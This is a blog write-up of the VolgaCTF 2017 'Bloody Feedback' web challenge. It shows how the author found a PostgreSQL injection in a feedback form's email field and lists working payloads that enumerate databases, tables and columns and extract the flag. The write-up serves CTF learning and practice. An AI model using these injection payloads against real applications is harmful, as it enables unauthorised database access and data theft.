<!doctype html><html lang=en-us>
<head>
<link rel=preload href=/lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous>
<script type=text/javascript src=https://latest.cactus.chat/cactus.js></script>
<link rel=stylesheet href=https://latest.cactus.chat/style.css type=text/css>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<title> VolgaCTF 2017: Bloody Feedback - web 100 | ChaGu CTF</title>
<link rel=canonical href=https://chagu.org/posts/volgactf-2017-quals_bloody_feedback_web_100/>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=robots content="all,follow">
<meta name=googlebot content="index,follow,snippet,archive">
<meta property="og:title" content="VolgaCTF 2017: Bloody Feedback - web 100">
<meta property="og:description" content="Author: @mjdubell
Bloody Feedback Send your feedback at bloody-feedback.quals.2017.volgactf.ru DO. NOT. USE. SQLMAP Otherwise your IP will be banned The challenge basically has two functions, 1) Send feedback and 2) view the status of the sent feedback. There is also page that cotains &ldquo;Top Messages&rdquo; which is the feedback people send in. When you send feedback you get a token back which you can use to see if the feedback has been processed or not.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://chagu.org/posts/volgactf-2017-quals_bloody_feedback_web_100/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2017-03-26T11:22:32+02:00">
<meta property="article:modified_time" content="2017-03-26T11:22:32+02:00">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="VolgaCTF 2017: Bloody Feedback - web 100">
<meta name=twitter:description content="Author: @mjdubell
Bloody Feedback Send your feedback at bloody-feedback.quals.2017.volgactf.ru DO. NOT. USE. SQLMAP Otherwise your IP will be banned The challenge basically has two functions, 1) Send feedback and 2) view the status of the sent feedback. There is also page that cotains &ldquo;Top Messages&rdquo; which is the feedback people send in. When you send feedback you get a token back which you can use to see if the feedback has been processed or not.">
<link rel=stylesheet href=https://chagu.org/css/styles.877f0d187d777677210859d158f899b22bc9251cff14ab3f2aeaaf7e09c4b15a691db4d151e8f0be980792a40c8d658ffb0a5ed37ea53eccec5125ee4e6055b7.css integrity="sha512-h38NGH13dnchCFnRWPiZsivJJRz/FKs/KuqvfgnEsVppHbTRUejwvpgHkqQMjWWP+wpe036lPszsUSXuTmBVtw=="><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script>
<script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]-->
<link rel=icon type=image/png href=https://chagu.org/images/favicon.ico>
</head>
<body class="max-width mx-auto px3 ltr">
<div class="content index py4">
<div id=header-post>
<a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=top-icon-tablet href=# onclick="$('html, body').animate({scrollTop:0},'fast')" style=display:none aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
<span id=menu>
<span id=nav>
<ul>
<li><a href=/>Home</a></li>
<li><a href=/posts>Writeups</a></li>
<li><a href=/tags>Tags</a></li>
<li><a href=/about>About</a></li>
</ul>
</span>
<br>
<span id=actions>
<ul>
<li>
<a class=icon href=https://chagu.org/posts/volgactf-2017-quals_share_point_web_200/ aria-label=Previous>
<i class="fas fa-chevron-left" aria-hidden=true onmouseover="$('#i-prev').toggle()" onmouseout="$('#i-prev').toggle()"></i>
</a>
</li>
<li>
<a class=icon href=https://chagu.org/posts/uiuctf-2017_out_of_the_woods_rev350/ aria-label=Next>
<i class="fas fa-chevron-right" aria-hidden=true onmouseover="$('#i-next').toggle()" onmouseout="$('#i-next').toggle()"></i>
</a>
</li>
<li>
<a class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast')" aria-label="Top of Page">
<i class="fas fa-chevron-up" aria-hidden=true onmouseover="$('#i-top').toggle()" onmouseout="$('#i-top').toggle()"></i>
</a>
</li>
<li>
<a class=icon href=# aria-label=Share>
<i class="fas fa-share-alt" aria-hidden=true onmouseover="$('#i-share').toggle()" onmouseout="$('#i-share').toggle()" onclick="return $('#share').toggle(),!1"></i>
</a>
</li>
</ul>
<span id=i-prev class=info style=display:none>Previous post</span>
<span id=i-next class=info style=display:none>Next post</span>
<span id=i-top class=info style=display:none>Back to top</span>
<span id=i-share class=info style=display:none>Share post</span>
</span>
<br>
<div id=share style=display:none>
<ul>
<li>
<a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_bloody_feedback_web_100%2f" aria-label=Facebook>
<i class="fab fa-facebook" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://twitter.com/share?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_bloody_feedback_web_100%2f&text=VolgaCTF%202017%3a%20Bloody%20Feedback%20-%20web%20100" aria-label=Twitter>
<i class="fab fa-twitter" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_bloody_feedback_web_100%2f&title=VolgaCTF%202017%3a%20Bloody%20Feedback%20-%20web%20100" aria-label=Linkedin>
<i class="fab fa-linkedin" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_bloody_feedback_web_100%2f&is_video=false&description=VolgaCTF%202017%3a%20Bloody%20Feedback%20-%20web%20100" aria-label=Pinterest>
<i class="fab fa-pinterest" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="mailto:?subject=VolgaCTF%202017%3a%20Bloody%20Feedback%20-%20web%20100&body=Check out this article: https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_bloody_feedback_web_100%2f" aria-label=Email>
<i class="fas fa-envelope" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_bloody_feedback_web_100%2f&title=VolgaCTF%202017%3a%20Bloody%20Feedback%20-%20web%20100" aria-label=Pocket>
<i class="fab fa-get-pocket" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_bloody_feedback_web_100%2f&title=VolgaCTF%202017%3a%20Bloody%20Feedback%20-%20web%20100" aria-label=reddit>
<i class="fab fa-reddit" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_bloody_feedback_web_100%2f&name=VolgaCTF%202017%3a%20Bloody%20Feedback%20-%20web%20100&description=Author%3a%20%40mjdubell%0aBloody%20Feedback%20Send%20your%20feedback%20at%20bloody-feedback.quals.2017.volgactf.ru%20DO.%20NOT.%20USE.%20SQLMAP%20Otherwise%20your%20IP%20will%20be%20banned%20The%20challenge%20basically%20has%20two%20functions%2c%201%29%20Send%20feedback%20and%202%29%20view%20the%20status%20of%20the%20sent%20feedback.%20There%20is%20also%20page%20that%20cotains%20%26ldquo%3bTop%20Messages%26rdquo%3b%20which%20is%20the%20feedback%20people%20send%20in.%20When%20you%20send%20feedback%20you%20get%20a%20token%20back%20which%20you%20can%20use%20to%20see%20if%20the%20feedback%20has%20been%20processed%20or%20not." aria-label=Tumblr>
<i class="fab fa-tumblr" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_bloody_feedback_web_100%2f&t=VolgaCTF%202017%3a%20Bloody%20Feedback%20-%20web%20100" aria-label="Hacker News">
<i class="fab fa-hacker-news" aria-hidden=true></i>
</a>
</li>
</ul>
</div>
<div id=toc>
<nav id=TableOfContents></nav>
</div>
</span>
</div>
<article class=post itemscope itemtype=http://schema.org/BlogPosting>
<header>
<h1 class=posttitle itemprop="name headline">
VolgaCTF 2017: Bloody Feedback - web 100
</h1>
<div class=meta>
<div class=postdate>
<time datetime="2017-03-26 11:22:32 +0200 +0200" itemprop=datePublished>2017-03-26</time>
</div>
<div class=article-read-time>
<i class="far fa-clock"></i>
3 minute read
</div>
<div class=article-tag>
<i class="fas fa-tag"></i>
<a class=tag-link href=/tags/web rel=tag>Web</a>
,
<a class=tag-link href=/tags/sql-injection rel=tag>SQL Injection</a>
</div>
</div>
</header>
<div class=content itemprop=articleBody>
<p>Author: <a href=https://twitter.com/mjdubell>@mjdubell</a></p>
<pre tabindex=0><code>Bloody Feedback

Send your feedback at bloody-feedback.quals.2017.volgactf.ru

DO. NOT. USE. SQLMAP
Otherwise your IP will be banned
</code></pre><p>The challenge basically has two functions, 1) Send feedback and 2) view the status of the sent feedback. There is also page that cotains &ldquo;Top Messages&rdquo; which is the feedback people send in. When you send feedback you get a token back which you can use to see if the feedback has been processed or not.</p>
<p>I first tried to steal cookies via the feedback form but it turned out that everything was filtered. My second try involved finding a SQL injection vulnerability at the feedback status page:</p>
<pre tabindex=0><code>http://bloody-feedback.quals.2017.volgactf.ru/check/?code=&lt;token here&gt;
</code></pre><p><img src=images/not_processed.png alt=not_processed></p>
<p>I got nothing, the only thing I could deduce was that every feedback sent, had a default status of &ldquo;not processed&rdquo;. I assumed this would change after a while but it never did.</p>
<p>My next attempt was to intercept the POST submission from the feedback form with burp to see if any parameters were vulnerable. By entering <code>lol'</code> as email, the following error was triggered:</p>
<pre tabindex=0><code>&lt;div class=&quot;container&quot;&gt;
&lt;div class=&quot;page-header&quot;&gt;
&lt;h2&gt;Error&lt;/h2&gt;
&lt;/div&gt;
&lt;div class=&quot;alert alert-danger&quot;&gt;
    &lt;p&gt;ERROR: DBD::Pg::db do failed: ERROR:  syntax error at or near &quot;not&quot;
    LINE 1: ...HRkIBBUOq9M40ZqvsB1TcwWVWt','smacker','m','lol'','not proces...
                                                     ^ at Worker.pm line 29.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
</code></pre><p>I realised that when you send your feedback, the program automatically inserts &ldquo;not processed&rdquo; along with the feedback. My working theory at ths point was to substitute the &ldquo;not processed&rdquo; field with an SQL query of my choosing. After a few tries I constructed the following query:</p>
<pre tabindex=0><code>name=smacker&amp;message=m&amp;email=lol',(select version()))--
</code></pre><p>However I got an error message indicating that the field allows a maximum of 30 chars, so I simply added substring():</p>
<pre tabindex=0><code>name=smacker&amp;message=m&amp;email=lol',(select substr(version(),0,30)))--
</code></pre><p><img src=images/postgres.png alt=not_processed></p>
<p>Now when I checked the status page of my feedback with the token I got, instead of seeing &ldquo;not processed&rdquo;, I saw <code>PostgreSQL 9.5.6 on x86_64-pc</code>. Now I knew how to display my SQL queries on the site, by overwriting the &ldquo;not processed&rdquo; field.</p>
<p>So I tried a few other things:</p>
<pre tabindex=0><code>user = fcgi_user         =&gt;  name=smacker&amp;message=m&amp;email=lol',(select substr(user,0,30)))--
database = feedback_db   =&gt;  name=smacker&amp;message=m&amp;email=lol',(select substr(current_database(),0,30)))--
</code></pre><p>Since the field can&rsquo;t hold multiple rows/values, I had to use LIMIT X OFFSET Y in order to step through each element in the set that the database returned. The following code snippets shows how I enumerated the database to find the flag.</p>
<p><strong>Databases:</strong></p>
<pre tabindex=0><code>postgres =&gt; name=smacker&amp;message=m&amp;email=lol',(select substr(datname ,0,30) FROM pg_database LIMIT 1 OFFSET 1))--
template1 =&gt; name=smacker&amp;message=m&amp;email=lol',(select substr(datname ,0,30) FROM pg_database LIMIT 1 OFFSET 2))--
feedback_db =&gt; name=smacker&amp;message=m&amp;email=lol',(select substr(datname ,0,30) FROM pg_database LIMIT 1 OFFSET 3))--
</code></pre><p><strong>TABLES:</strong></p>
<pre tabindex=0><code>s3cret_tabl3 =&gt; name=smacker&amp;message=m&amp;email=lol',(select table_name FROM information_schema.tables WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 1))--
</code></pre><p><strong>COLUMNS:</strong></p>
<pre tabindex=0><code>name =&gt;  name=smacker&amp;message=m&amp;email=lol',(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 1))--
email =&gt; name=smacker&amp;message=m&amp;email=lol',(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 2))--
message =&gt; name=smacker&amp;message=m&amp;email=lol',(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 3))--
status =&gt; name=smacker&amp;message=m&amp;email=lol',(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 4))--
id =&gt; name=smacker&amp;message=m&amp;email=lol',(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 5))--
s3cr3tc0lumn =&gt; name=smacker&amp;message=m&amp;email=lol',(select column_name FROM information_schema.columns WHERE table_schema%3Dcurrent_schema() LIMIT 1 OFFSET 6))--
</code></pre><p><strong>Time to get the rows from <code>s3cr3tc0lumn</code></strong></p>
<pre tabindex=0><code>VolgaCTF =&gt; name=smacker&amp;message=m&amp;email=lol',(select s3cr3tc0lumn FROM s3cret_tabl3 LIMIT 1 OFFSET 1))--
Volga =&gt; name=smacker&amp;message=m&amp;email=lol',(select s3cr3tc0lumn FROM s3cret_tabl3 LIMIT 1 OFFSET 2))--
1 =&gt; name=smacker&amp;message=m&amp;email=lol',(select s3cr3tc0lumn FROM s3cret_tabl3 LIMIT 1 OFFSET 3))--
VolgaCTF{eiU7UJhyeu@ud3*} =&gt; name=smacker&amp;message=m&amp;email=lol',(select s3cr3tc0lumn FROM s3cret_tabl3 LIMIT 1 OFFSET 4))--
</code></pre><p><img src=images/flag.png alt=not_processed></p>
<p><strong>Flag: VolgaCTF{eiU7UJhyeu@ud3*}</strong></p>
</div>
</article>
<div id=footer-post-container>
<div id=footer-post>
<div id=nav-footer style=display:none>
<ul>
<li><a href=/>Home</a></li>
<li><a href=/posts>Writeups</a></li>
<li><a href=/tags>Tags</a></li>
<li><a href=/about>About</a></li>
</ul>
</div>
<div id=toc-footer style=display:none>
<nav id=TableOfContents></nav>
</div>
<div id=share-footer style=display:none>
<ul>
<li>
<a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_bloody_feedback_web_100%2f" aria-label=Facebook>
<i class="fab fa-facebook fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://twitter.com/share?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_bloody_feedback_web_100%2f&text=VolgaCTF%202017%3a%20Bloody%20Feedback%20-%20web%20100" aria-label=Twitter>
<i class="fab fa-twitter fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_bloody_feedback_web_100%2f&title=VolgaCTF%202017%3a%20Bloody%20Feedback%20-%20web%20100" aria-label=Linkedin>
<i class="fab fa-linkedin fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_bloody_feedback_web_100%2f&is_video=false&description=VolgaCTF%202017%3a%20Bloody%20Feedback%20-%20web%20100" aria-label=Pinterest>
<i class="fab fa-pinterest fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="mailto:?subject=VolgaCTF%202017%3a%20Bloody%20Feedback%20-%20web%20100&body=Check out this article: https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_bloody_feedback_web_100%2f" aria-label=Email>
<i class="fas fa-envelope fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_bloody_feedback_web_100%2f&title=VolgaCTF%202017%3a%20Bloody%20Feedback%20-%20web%20100" aria-label=Pocket>
<i class="fab fa-get-pocket fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_bloody_feedback_web_100%2f&title=VolgaCTF%202017%3a%20Bloody%20Feedback%20-%20web%20100" aria-label=reddit>
<i class="fab fa-reddit fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_bloody_feedback_web_100%2f&name=VolgaCTF%202017%3a%20Bloody%20Feedback%20-%20web%20100&description=Author%3a%20%40mjdubell%0aBloody%20Feedback%20Send%20your%20feedback%20at%20bloody-feedback.quals.2017.volgactf.ru%20DO.%20NOT.%20USE.%20SQLMAP%20Otherwise%20your%20IP%20will%20be%20banned%20The%20challenge%20basically%20has%20two%20functions%2c%201%29%20Send%20feedback%20and%202%29%20view%20the%20status%20of%20the%20sent%20feedback.%20There%20is%20also%20page%20that%20cotains%20%26ldquo%3bTop%20Messages%26rdquo%3b%20which%20is%20the%20feedback%20people%20send%20in.%20When%20you%20send%20feedback%20you%20get%20a%20token%20back%20which%20you%20can%20use%20to%20see%20if%20the%20feedback%20has%20been%20processed%20or%20not." aria-label=Tumblr>
<i class="fab fa-tumblr fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fchagu.org%2fposts%2fvolgactf-2017-quals_bloody_feedback_web_100%2f&t=VolgaCTF%202017%3a%20Bloody%20Feedback%20-%20web%20100" aria-label="Hacker News">
<i class="fab fa-hacker-news fa-lg" aria-hidden=true></i>
</a>
</li>
</ul>
</div>
<div id=actions-footer>
<a id=menu-toggle class=icon href=# onclick="return $('#nav-footer').toggle(),!1" aria-label=Menu>
<i class="fas fa-bars fa-lg" aria-hidden=true></i> Menu</a>
<a id=toc-toggle class=icon href=# onclick="return $('#toc-footer').toggle(),!1" aria-label=TOC>
<i class="fas fa-list fa-lg" aria-hidden=true></i> TOC</a>
<a id=share-toggle class=icon href=# onclick="return $('#share-footer').toggle(),!1" aria-label=Share>
<i class="fas fa-share-alt fa-lg" aria-hidden=true></i> share</a>
<a id=top style=display:none class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast')" aria-label="Top of Page">
<i class="fas fa-chevron-up fa-lg" aria-hidden=true></i> Top</a>
</div>
</div>
</div>
<footer id=footer>
<div class=footer-left>
Copyright &copy; 2021 ChaGu CTF
</div>
<div class=footer-right>
<nav>
<ul>
<li><a href=/>Home</a></li>
<li><a href=/posts>Writeups</a></li>
<li><a href=/tags>Tags</a></li>
<li><a href=/about>About</a></li>
</ul>
</nav>
</div>
</footer>
</div>
</body>
<link rel=stylesheet href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>
<script src=/js/code-copy.js></script>
</html>